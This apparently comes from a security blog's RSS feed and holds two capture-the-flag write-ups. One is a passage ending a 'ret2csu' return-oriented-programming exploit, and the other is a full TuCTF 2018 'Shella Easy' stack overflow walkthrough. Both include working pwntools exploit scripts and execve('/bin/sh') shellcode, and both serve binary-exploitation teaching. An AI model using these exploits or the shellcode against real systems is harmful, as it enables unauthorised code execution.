&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./ret2csu&amp;#39;&lt;/span>)
gdb&lt;span style="color:#f92672">.&lt;/span>attach(r)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(cyclic(&lt;span style="color:#ae81ff">200&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can continue within GDB, and print the value at the top of the stack to get the value stored in the return pointer.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; x/gx $rsp
0x7ffe9d7c4538: 0x6161616161616166
&lt;/code>&lt;/pre>&lt;p>Using pwntools' &lt;code>cyclic_find&lt;/code> function we can get the offset from the start of our input buffer to the return address stored on the stack.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">2&lt;/span>]: cyclic_find(&lt;span style="color:#ae81ff">0x6161616161616166&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">40&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Next let&amp;rsquo;s figure out how we can store a value in the &lt;code>$rdx&lt;/code> register. We&amp;rsquo;re able to store values in the &lt;code>$rdi&lt;/code> and &lt;code>$rsi&lt;/code> registers quite easily (they have &lt;code>pop; ret&lt;/code> gadgets we can easily use).&lt;/p>
&lt;p>After digging around the &lt;code>__libc_csu_init&lt;/code> function, we find two interesting looking gadgets, see below (I&amp;rsquo;ve added some comments for clarity).&lt;/p>
&lt;p>Note that we can use the first gadget to set the values of &lt;code>$rsi&lt;/code> and &lt;code>$rdx&lt;/code>.&lt;/p>
&lt;pre>&lt;code>0x00400680 4c89fa mov rdx, r15
0x00400683 4c89f6 mov rsi, r14
0x00400686 4489ef mov edi, r13d
0x00400689 41ff14dc call qword [r12 + rbx*8]
0x0040068d 4883c301 add rbx, 1
0x00400691 4839dd cmp rbp, rbx
0x00400694 75ea jne 0x400680
&lt;/code>&lt;/pre>&lt;pre>&lt;code>0x0040069a 5b pop rbx ; set to 0
0x0040069b 5d pop rbp ; set to 1 to bypass check after call
0x0040069c 415c pop r12 ; set to pointer to useless function
0x0040069e 415d pop r13
0x004006a0 415e pop r14 ; set to 0xcafebabecafebabe to store in $rsi
0x004006a2 415f pop r15 ; set to 0xd00df00dd00df00d to store in $rdx
0x004006a4 c3 ret
&lt;/code>&lt;/pre>&lt;p>It&amp;rsquo;ll be a little complex, but we should be able to use these to get the values we want into our target registers.&lt;/p>
&lt;p>We can use the second gadget to set up for the first gadget (so we can move the correct values into our target registers).&lt;/p>
&lt;p>Note the &lt;code>call qword [r12 + rbx*8]&lt;/code> instruction. As it dereferences a pointer to a function, we can&amp;rsquo;t use this to redirect execution.&lt;/p>
&lt;pre>&lt;code>0x00400686 4489ef mov edi, r13d
0x00400689 41ff14dc call qword [r12 + rbx*8]
0x0040068d 4883c301 add rbx, 1
&lt;/code>&lt;/pre>&lt;p>Instead we&amp;rsquo;ll have to find a pointer to some function that doesn&amp;rsquo;t change anything, as to not ruin the values stored in our target registers. We&amp;rsquo;ll just pass by this call and head to the &lt;code>ret&lt;/code> instruction below.&lt;/p>
&lt;p>Let&amp;rsquo;s take a look at the functions stored in the binary, and see if we can find any pointers to them.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; info functions
All defined functions:
Non-debugging symbols:
0x00000000004004d0 _init
0x0000000000400500 pwnme@plt
0x0000000000400510 ret2win@plt
0x0000000000400520 _start
0x0000000000400550 _dl_relocate_static_pie
0x0000000000400560 deregister_tm_clones
0x0000000000400590 register_tm_clones
0x00000000004005d0 __do_global_dtors_aux
0x0000000000400600 frame_dummy
0x0000000000400607 main
0x0000000000400617 usefulFunction
0x0000000000400640 __libc_csu_init
0x00000000004006b0 __libc_csu_fini
0x00000000004006b4 _fini
&lt;/code>&lt;/pre>&lt;p>Using &lt;code>objdump&lt;/code> and &lt;code>grep&lt;/code> we can look for the first couple bytes of each function, and see if they show up anywhere in the disassembly.&lt;/p>
&lt;p>The address that immediately jumps out to me is &lt;code>0x4003af&lt;/code>, which contains the bytes for the &lt;code>_fini&lt;/code> function, a suitably inert function.&lt;/p>
&lt;pre>&lt;code>$ objdump -D ret2csu | grep '06 40' -B 1
4003ad: 00 0e add %cl,(%rsi)
4003af: 00 b4 06 40 00 00 00 add %dh,0x40(%rsi,%rax,1)
--
40052e: 54 push %rsp
40052f: 49 c7 c0 b0 06 40 00 mov $0x4006b0,%r8
400536: 48 c7 c1 40 06 40 00 mov $0x400640,%rcx
40053d: 48 c7 c7 07 06 40 00 mov $0x400607,%rdi
--
600e45: 00 00 add %al,(%rax)
600e47: 00 b4 06 40 00 00 00 add %dh,0x40(%rsi,%rax,1)
&lt;/code>&lt;/pre>&lt;p>We can look this up in GDB to be sure (adding 1 to align the address correctly).&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; x/x (0x4003af + 1)
0x4003b0: 0x00000000004006b4
&lt;/code>&lt;/pre>&lt;p>Now we can use the &lt;code>ropper&lt;/code> tool to find a gadget to set the value of &lt;code>$rdi&lt;/code>. Surprise, surprise, we immediately find one.&lt;/p>
&lt;pre>&lt;code>$ ropper --file ./ret2csu --search '% rdi'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: % rdi
[INFO] File: ./ret2csu
0x00000000004006a3: pop rdi; ret;
&lt;/code>&lt;/pre>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>We have all the information we need, so let&amp;rsquo;s start building our exploit. Here&amp;rsquo;s an outline of what we want to achieve:&lt;/p>
&lt;ul>
&lt;li>Overwrite the return address in the &lt;code>pwnme&lt;/code> function.&lt;/li>
&lt;li>Store the values &lt;code>0xcafebabecafebabe&lt;/code> and &lt;code>0xd00df00dd00df00d&lt;/code> in the &lt;code>$rsi&lt;/code> and &lt;code>$rdx&lt;/code> registers.&lt;/li>
&lt;li>Store the value &lt;code>0xdeadbeefdeadbeef&lt;/code> in the &lt;code>$rdi&lt;/code> register.&lt;/li>
&lt;li>Call the &lt;code>ret2win&lt;/code> function with the above values.&lt;/li>
&lt;/ul>
&lt;p>Note: we have to be pretty careful when using the gadgets we found in the csu function, in order to pass the check after the call, we have to set the values &lt;code>$rbp = 1&lt;/code> and &lt;code>$rbx = 0&lt;/code>.&lt;/p>
&lt;p>We also have to pad out the stack so that the &lt;code>pop&lt;/code> instructions after the call don&amp;rsquo;t destroy our rop chain.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>arch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">pop rbx ; 0
&lt;/span>&lt;span style="color:#e6db74">pop rbp ; 1
&lt;/span>&lt;span style="color:#e6db74">pop r12 ; 0x4003af+1
&lt;/span>&lt;span style="color:#e6db74">pop r13
&lt;/span>&lt;span style="color:#e6db74">pop r14 ; 0xcafebabecafebabe
&lt;/span>&lt;span style="color:#e6db74">pop r15 ; 0xd00df00dd00df00d
&lt;/span>&lt;span style="color:#e6db74">ret ; ret2csu_rdx
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
ret2csu_set &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x00400680&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">mov rdx, r15
&lt;/span>&lt;span style="color:#e6db74">mov rsi, r14
&lt;/span>&lt;span style="color:#e6db74">mov edi, r13d
&lt;/span>&lt;span style="color:#e6db74">call qword [r12 + rbx*8]
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
ret2csu_rdx &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0040069a&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">pop rdi ; 0xdeadbeefdeadbeef
&lt;/span>&lt;span style="color:#e6db74">ret ; ret2win
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
pop_rdi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x004006a3&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">jmp qword [reloc.ret2win]
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
ret2win &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x00400510&lt;/span>
elf &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./ret2csu&amp;#39;&lt;/span>)
rop &lt;span style="color:#f92672">=&lt;/span> ROP(elf)
&lt;span style="color:#75715e"># ret2csu_set&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(ret2csu_rdx)
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop rbx&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#75715e"># pop rbp&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0x4003af&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#75715e"># pop r12&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r13&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0xcafebabecafebabe&lt;/span>) &lt;span style="color:#75715e"># pop r14&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0xd00df00dd00df00d&lt;/span>) &lt;span style="color:#75715e"># pop r15&lt;/span>
&lt;span style="color:#75715e"># ret2csu_rdx&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(ret2csu_set)
&lt;span style="color:#75715e"># pop_rdi&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># stack alignment&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop rbx&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop rbp&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r12&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r13&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r14&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r15&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(pop_rdi)
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>) &lt;span style="color:#75715e"># pop rdi&lt;/span>
&lt;span style="color:#75715e"># ret2win&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(ret2win)
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./ret2csu&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span> &lt;span style="color:#f92672">+&lt;/span> rop&lt;span style="color:#f92672">.&lt;/span>chain())
r&lt;span style="color:#f92672">.&lt;/span>readline()
log&lt;span style="color:#f92672">.&lt;/span>success(&lt;span style="color:#e6db74">&amp;#39;Flag: &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>readline()&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>))
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s our exploit in action.&lt;/p>
&lt;pre>&lt;code>./exploit.py
[*] './ret2csu'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
RUNPATH: b'.'
[*] Loaded 13 cached gadgets for './ret2csu'
[+] Starting local process './ret2csu': pid 1110
[+] Flag: ROPE{a_placeholder_32byte_flag!}
[*] Process './ret2csu' stopped with exit code 0 (pid 1110)
&lt;/code>&lt;/pre></content></item><item><title>TuCTF 2018 :: Shella Easy</title><link>https://anvbis.github.io/posts/tuctf-2018-shella-easy/</link><pubDate>Wed, 11 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/tuctf-2018-shella-easy/</guid><description>Reverse Engineering From the file command we can see that it is a dynamically linked linux executable.
$ file shella-easy shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped Running checksec on the binary reveals that it contains no exploit protections in place (particularly of note are the lack of stack canary, PIE is not enabled, and that the NX bit is not set).</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>From the &lt;code>file&lt;/code> command we can see that it is a dynamically linked linux executable.&lt;/p>
&lt;pre>&lt;code>$ file shella-easy
shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped
&lt;/code>&lt;/pre>&lt;p>Running &lt;code>checksec&lt;/code> on the binary reveals that it contains no exploit protections in place (particularly of note are the lack of stack canary, PIE is not enabled, and that the NX bit is not set).&lt;/p>
&lt;pre>&lt;code>$ checksec ./shella-easy
[*] './shella-easy'
Arch: i386-32-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX disabled
PIE: No PIE (0x8048000)
RWX: Has RWX segments
&lt;/code>&lt;/pre>&lt;p>This means a few things for us:&lt;/p>
&lt;ul>
&lt;li>We know where everything is stored inside the binary.&lt;/li>
&lt;li>We can execute arbitrary shellcode on the stack.&lt;/li>
&lt;li>A stack overflow can give us control over program execution.&lt;/li>
&lt;/ul>
&lt;p>Running &lt;code>shella-easy&lt;/code> shows that the binary (at some point) takes user input. We&amp;rsquo;ll need to reverse it in order to understand how it does this, but it is a potential avenue for exploitation.&lt;/p>
&lt;pre>&lt;code>$ ./shella-easy
I'll have a 0xffc40780 with a side of fries thanks
asdfasdf
&lt;/code>&lt;/pre>&lt;p>Reversing the &lt;code>main&lt;/code> function of the binary reveals that it uses &lt;code>gets&lt;/code> to take user input. As we suspected, this is likely where we can exploit this.&lt;/p>
&lt;pre>&lt;code>0x08048532 83c408 add esp, 8
0x08048535 8d45b8 lea eax, [s]
0x08048538 50 push eax ; char *s
0x08048539 e852feffff call sym.imp.gets ; char *gets(char *s)
&lt;/code>&lt;/pre>&lt;p>Another important thing to note, is that the binary does have some protections in place against stack overflows; if the variable &lt;code>var_8h&lt;/code> is not set to &lt;code>0xdeadbeef&lt;/code>, the binary will immediately exit (instead of returning and giving us control).&lt;/p>
&lt;pre>&lt;code> 0x08048541 817df8efbead. cmp dword [var_8h], 0xdeadbeef
┌─&amp;lt; 0x08048548 7407 je 0x8048551
│ 0x0804854a 6a00 push 0 ; int status
│ 0x0804854c e84ffeffff call sym.imp.exit ; void exit(int status)
└─&amp;gt; 0x08048551 b800000000 mov eax, 0
0x08048556 8b5dfc mov ebx, dword [var_4h]
0x08048559 c9 leave
0x0804855a c3 ret
&lt;/code>&lt;/pre>&lt;p>We can also see that this variable &lt;code>var_8h&lt;/code> is initially set to a value of &lt;code>0xcafebabe&lt;/code> higher up in the instruction stream.&lt;/p>
&lt;pre>&lt;code>0x0804851b c745f8bebafe. mov dword [var_8h], 0xcafebabe
&lt;/code>&lt;/pre>&lt;p>We&amp;rsquo;ll want to find out where &lt;code>var_8h&lt;/code> is stored relative to where our input &lt;code>s&lt;/code> is stored, so we can overwrite the value of it in order to bypass this check (when we perform our overflow).&lt;/p>
&lt;p>Radare tells us a little about where these variables are supposed to be stored (in the &lt;code>main&lt;/code> function header), but we&amp;rsquo;ll want to verify this later.&lt;/p>
&lt;pre>&lt;code>; var char *s @ ebp-0x48
; var uint32_t var_8h @ ebp-0x8
; var int32_t var_4h @ ebp-0x4
&lt;/code>&lt;/pre>&lt;p>We can see that the &lt;code>var_8h&lt;/code> is stored below our input buffer &lt;code>s&lt;/code> on the stack, this is good for us as we can overwrite its value when we perform our overflow.&lt;/p>
&lt;p>A quick calculation &lt;code>0x48 - 0x8 = 0x40 = 64&lt;/code> tells us that &lt;code>var_8h&lt;/code> is stored 64 bytes after the start of our input buffer.&lt;/p>
&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>First, let&amp;rsquo;s spin up GDB and verify the location of &lt;code>var_8h&lt;/code> relative to our input buffer &lt;code>s&lt;/code>.&lt;/p>
&lt;p>We&amp;rsquo;ll set a breakpoint just after the &lt;code>gets&lt;/code> call so we can see what the stack looks like just after we&amp;rsquo;ve provided the binary with input.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; disassemble main
Dump of assembler code for function main:
...
0x08048539 &amp;lt;+94&amp;gt;: call 0x8048390 &amp;lt;gets@plt&amp;gt;
0x0804853e &amp;lt;+99&amp;gt;: add esp,0x4
0x08048541 &amp;lt;+102&amp;gt;: cmp DWORD PTR [ebp-0x8],0xdeadbeef
0x08048548 &amp;lt;+109&amp;gt;: je 0x8048551 &amp;lt;main+118&amp;gt;
0x0804854a &amp;lt;+111&amp;gt;: push 0x0
0x0804854c &amp;lt;+113&amp;gt;: call 0x80483a0 &amp;lt;exit@plt&amp;gt;
0x08048551 &amp;lt;+118&amp;gt;: mov eax,0x0
0x08048556 &amp;lt;+123&amp;gt;: mov ebx,DWORD PTR [ebp-0x4]
0x08048559 &amp;lt;+126&amp;gt;: leave
0x0804855a &amp;lt;+127&amp;gt;: ret
...
pwndbg&amp;gt; b *0x0804853e
Breakpoint 1 at 0x804853e
&lt;/code>&lt;/pre>&lt;p>We can now run the binary inside GDB and we&amp;rsquo;ll give it the value &lt;code>AAAA&lt;/code> when it prompts us for input, so we can easily see where our input is stored inside the stack.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; r
Starting program: ./shella-easy
Yeah I'll have a 0xffffcff0 with a side of fries thanks
AAAA
Breakpoint 1, 0x0804853e in main ()
...
&lt;/code>&lt;/pre>&lt;p>After dumping the relevant part of the stack, we can verify the location of &lt;code>var_8h&lt;/code> relative to &lt;code>s&lt;/code> with a simple calculation; &lt;code>0xffffd030 - 0xffffcff0 = 64&lt;/code>.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; x/20x $ebp-0x48
0xffffcff0: 0x41414141 0xf7fe3200 0x00000000 0xf7e02c1e
0xffffd000: 0xf7fb03fc 0xffffffff 0x00000000 0x080485ab
0xffffd010: 0x00000001 0xffffd0e4 0xffffd0ec 0x08048581
0xffffd020: 0xf7fe3230 0x00000000 0x08048569 0x00000000
0xffffd030: 0xcafebabe 0x00000000 0x00000000 0xf7de9e46
&lt;/code>&lt;/pre>&lt;p>While we&amp;rsquo;re at this breakpoint, we can also take a look at what the binary is leaking. Yep, it&amp;rsquo;s definitely the location of our input buffer on the stack, this will make the exploitation process a lot easier.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; x/x 0xffffcff0
0xffffcff0: 0x41414141
&lt;/code>&lt;/pre>&lt;p>Now let&amp;rsquo;s find the location of the function&amp;rsquo;s return address stored on the stack relative to our input buffer.&lt;/p>
&lt;p>We can write a quick script using pwntools that sends a cyclic pattern of bytes (with the &lt;code>var_8h&lt;/code> variable overwritten with &lt;code>0xdeadbeef&lt;/code>) that we can use to determine the location of the return address.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
pad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">64&lt;/span>
var &lt;span style="color:#f92672">=&lt;/span> p32(&lt;span style="color:#ae81ff">0xdeadbeef&lt;/span>)
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./shella-easy&amp;#39;&lt;/span>)
gdb&lt;span style="color:#f92672">.&lt;/span>debug(r)
r&lt;span style="color:#f92672">.&lt;/span>writeline(pad &lt;span style="color:#f92672">+&lt;/span> var &lt;span style="color:#f92672">+&lt;/span> cyclic(&lt;span style="color:#ae81ff">64&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We know that the program should crash once we&amp;rsquo;ve overwritten the return address with our bad data. So printing the value of &lt;code>$eip&lt;/code> after the crash should give us the bytes that the return address was overwritten with.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; p $eip
$1 = (void (*)()) 0x61616163
&lt;/code>&lt;/pre>&lt;p>We can use pwntools' &lt;code>cyclic_find&lt;/code> function and the bytes contained within &lt;code>eip&lt;/code> above, in order to find the offset of the return address from the end of our payload.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">2&lt;/span>]: cyclic_find(&lt;span style="color:#ae81ff">0x61616163&lt;/span>)
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">8&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>Now that we know the location of &lt;code>var_8h&lt;/code> and the return address relative to our input buffer we can begin to craft our exploit.&lt;/p>
&lt;p>We know that we can execute arbitrary code within the stack, so let&amp;rsquo;s write up some quick shellcode to give us an interactive shell.&lt;/p>
&lt;pre>&lt;code>.global _start
_start:
.intel_syntax noprefix
shell:
push 0x0068732f # &amp;quot;/sh&amp;quot;
push 0x6e69622f # &amp;quot;/bin&amp;quot;
mov ebx, esp # &amp;quot;/bin/sh&amp;quot;
mov ecx, 0
mov edx, 0
mov eax, 11
int 0x80 # execve(&amp;quot;/bin/sh&amp;quot;, 0, 0)
exit:
mov ebx, 0 # exit code
mov eax, 0
int 0x80 # exit(0)
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s compile our shellcode, and get a representation of it that we can use in our exploit code.&lt;/p>
&lt;pre>&lt;code>$ gcc -nostdlib -static shellcode.s -o shellcode -m32
$ objcopy --dump-section .text=payload shellcode
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">1&lt;/span>]: open(&lt;span style="color:#e6db74">&amp;#39;payload&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;rb&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read()
Out[&lt;span style="color:#ae81ff">1&lt;/span>]: &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;h/sh&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">h/bin&lt;/span>&lt;span style="color:#ae81ff">\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we can build our exploit. Here is an outline of what we want to achieve:&lt;/p>
&lt;ul>
&lt;li>Capture the leaked stack address.&lt;/li>
&lt;li>Overwrite &lt;code>var_8h&lt;/code> with &lt;code>0xdeadbeef&lt;/code>.&lt;/li>
&lt;li>Overwrite the return address using the leak.&lt;/li>
&lt;li>Get code execution.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
buf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;h/sh&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">h/bin&lt;/span>&lt;span style="color:#ae81ff">\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
pad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#ae81ff">64&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(buf))
var &lt;span style="color:#f92672">=&lt;/span> p32(&lt;span style="color:#ae81ff">0xdeadbeef&lt;/span>)
off &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./shella-easy&amp;#39;&lt;/span>)
&lt;span style="color:#75715e">#gdb.attach(r)&lt;/span>
&lt;span style="color:#75715e"># capture the leaked stack address&lt;/span>
r&lt;span style="color:#f92672">.&lt;/span>readuntil(&lt;span style="color:#e6db74">&amp;#39;Yeah I&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">ll have a &amp;#39;&lt;/span>)
leak &lt;span style="color:#f92672">=&lt;/span> p32(eval(r&lt;span style="color:#f92672">.&lt;/span>read(&lt;span style="color:#ae81ff">10&lt;/span>)))
r&lt;span style="color:#f92672">.&lt;/span>clean()
&lt;span style="color:#75715e"># send our payload to the binary&lt;/span>
r&lt;span style="color:#f92672">.&lt;/span>writeline(buf &lt;span style="color:#f92672">+&lt;/span> pad &lt;span style="color:#f92672">+&lt;/span> var &lt;span style="color:#f92672">+&lt;/span> off &lt;span style="color:#f92672">+&lt;/span> leak)
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s the exploit in action.&lt;/p>
&lt;pre>&lt;code>./exploit.py
[+] Starting local process './shella-easy': pid 3768
[*] Switching to interactive mode
$ cat flag.txt
TuCTF{Shella Easy}
&lt;/code>&lt;/pre></content></item></channel></rss>